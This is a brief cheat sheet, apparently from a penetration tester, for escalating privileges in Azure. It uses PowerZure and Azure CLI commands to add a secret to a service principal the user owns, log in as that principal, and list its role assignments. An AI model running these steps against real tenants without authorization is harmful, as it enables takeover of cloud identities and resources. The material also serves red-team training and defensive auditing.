# Misconfigured Service Principals Privesc

### Tools: Powerzure

## Steps:

 - Import-Module Powerzure.ps1 (Import powerzure module)

 - Get-AzureAppOwner (Verify whether the current user is assigned as the owner of a service principal)

 - Add-AzureSPSecret -ApplicationName APP_NAME -Password PASSWORD (Add a new secret to APP_NAME to allow us to authenticate with the app)

 - $Credential = Get-Credential

 - Connect-AzAccount -Credential $Credential -Tenant TENANT_ID -ServicePrincipal (Windows Powershell)

## OR

 - az login --service-principal --username APP_ID --password PASSWORD --tenant TENANT_ID (Azure CLI)

## NOTE: Don't forget to make a note of the APP_ID to authenticate as the service principal!

 - az role assignment list --assignee APP_ID --include-groups --include-inherited --query '[].{username:principalName, role:roleDefinitionName, usertype:principalType, scope:scope}' (Verify the role assignment and scope of the service principal)
